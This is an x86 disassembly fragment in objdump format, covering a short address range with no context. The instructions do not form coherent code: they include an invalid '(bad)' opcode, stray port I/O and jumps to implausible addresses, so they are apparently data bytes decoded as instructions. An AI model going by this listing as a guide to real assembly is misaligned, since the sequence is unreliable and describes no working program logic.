  41138a:	or     BYTE PTR [edi+eax*1+0x51],dl
  41138e:	ret    
  41138f:	xor    ebx,DWORD PTR [ebx+0x37232be]
  411395:	add    BYTE PTR [ecx+0x147c8bfe],cl
  41139b:	or     al,0x80
  41139d:	jge    0x4113a0
  41139f:	mov    DWORD PTR [eax],eax
  4113a1:	and    al,0x8
  4113a3:	cmp    DWORD PTR [ebp+0x10],eax
  4113a6:	mov    edx,DWORD PTR [esi]
  4113a8:	xchg   esp,eax
  4113a9:	dec    esp
  4113aa:	add    BYTE PTR [eax],dl
  4113ac:	mov    ecx,edx
  4113ae:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4113b2:	dec    ebp
  4113b3:	into   
  4113b4:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4113ba:	mov    edx,DWORD PTR [eax+0x14]
  4113bd:	das    
  4113be:	add    al,0x45
  4113c0:	add    BYTE PTR [ebp+0x0],dh
  4113c3:	mov    edi,edi
  4113c5:	and    al,0x50
  4113c7:	mov    eax,DWORD PTR [eax]
  4113c9:	and    al,0xd1
  4113cb:	xor    eax,DWORD PTR [esi]
  4113cd:	lea    eax,[ebp+0x8]
  4113d0:	xor    esi,DWORD PTR [edx+0x3]
  4113d3:	add    BYTE PTR [ecx+0x4510fc44],cl
  4113d9:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4113df:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4113e9:	cmp    al,0xff
  4113eb:	pushf  
  4113ec:	mov    edi,edi
  4113ee:	or     BYTE PTR [esi+ecx*1],cl
  4113f1:	jne    0x4113b6
  4113f3:	call   0xa13bf
  4113f8:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4113fc:	mov    ebx,DWORD PTR [eax]
  4113fe:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  411402:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41140a:	pop    esi
  41140b:	dec    ecx
  41140d:	and    al,0x10
  41140f:	call   DWORD PTR [ebp+0x24]
  411412:	in     al,dx
  411413:	call   0xffc512fc
  411418:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41141c:	pushf  
  41141d:	pop    esi
  41141e:	mov    ebp,esp
  411420:	and    al,0xc2
  411422:	push   edi
  411423:	add    BYTE PTR [ecx+0x33],al
  411426:	mov    DWORD PTR [ebp+0x24],esi
  411429:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41142f:	dec    DWORD PTR [eax]
  411431:	and    al,0x7
  411433:	(bad)  
  411434:	cli    
  411435:	and    al,0x9b
  411437:	or     BYTE PTR [edx],dh
  411439:	sbb    BYTE PTR [ebx],al
  41143b:	adc    al,0x89
  41143d:	jmp    DWORD PTR [esp]
  411440:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  411446:	adc    al,0x8
  411448:	dec    ebp
  411449:	adc    BYTE PTR [ebp-0x7c],dh
  41144c:	mov    esi,DWORD PTR [edx]
  41144e:	and    al,0x24
  411450:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  411456:	add    edi,eax
  411458:	pcmpeqb mm1,mm2
  41145b:	jmp    0x4114a9
  41145d:	dec    DWORD PTR [eax]
  41145f:	je     0x41144c
  411461:	mov    edi,DWORD PTR [ecx]
  411463:	pop    ebp
  411464:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  411468:	fwait
  411469:	mov    DWORD PTR [eax-0x8],ebp
  41146c:	jge    0x4114d6
  41146e:	dec    DWORD PTR [ecx+0x5fbf7424]
